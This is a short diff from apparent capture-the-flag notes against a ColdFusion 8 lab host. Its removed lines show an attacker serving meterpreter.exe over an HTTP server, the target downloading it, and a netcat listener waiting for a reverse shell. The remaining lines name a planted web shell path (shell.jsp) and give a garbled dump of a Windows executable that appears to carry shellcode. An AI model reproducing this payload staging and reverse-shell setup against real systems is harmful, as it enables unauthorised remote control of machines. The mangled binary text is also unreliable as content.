@@ -2,20 +2,6 @@
 
 
 
-hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
-[sudo] password for hippoeug: 
-Serving HTTP on 0.0.0.0 port 80 ...
-10.10.14.15 - - [24/Jan/2021 14:59:21] "GET / HTTP/1.1" 200 -
-10.10.14.15 - - [24/Jan/2021 16:09:46] "GET / HTTP/1.1" 200 -
-10.10.14.15 - - [24/Jan/2021 16:16:42] "GET /meterpreter.exe HTTP/1.1" 200 -
-10.10.10.11 - - [24/Jan/2021 16:21:21] "GET /meterpreter.exe HTTP/1.1" 200 -
-
-
-hippoeug@kali:~$ nc -lvnp 4545
-listening on [any] 4545 ...
-
-
-
 C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
 
 MZ???¸@Èº´ Í!¸LÍ!This program cannot be run in DOS mode. $9$Ý}E?}E?}E?Zƒ?~E?}E~?E?t=ê?|E?t=î?|E?Rich}E?PEd†}<ÆKð#0@@xBHÊƒ€BlpB0.textN `.rdata„0@@.fydhx@ àHƒì(IÇÁ@IÇÀ0HÇÂH3Éè'HÇÁH¾A@H‹øó¤?ÐH3ÉèPAYLOAD:Ì?%À?%²NB^B@0v00f0X0ExitProcessXVirtualAllocKERNEL32.dllüHƒäðèÌAQAPRQVH1?eH‹R`H‹RH‹R H‹rPH·JJM1ÉH1À¬
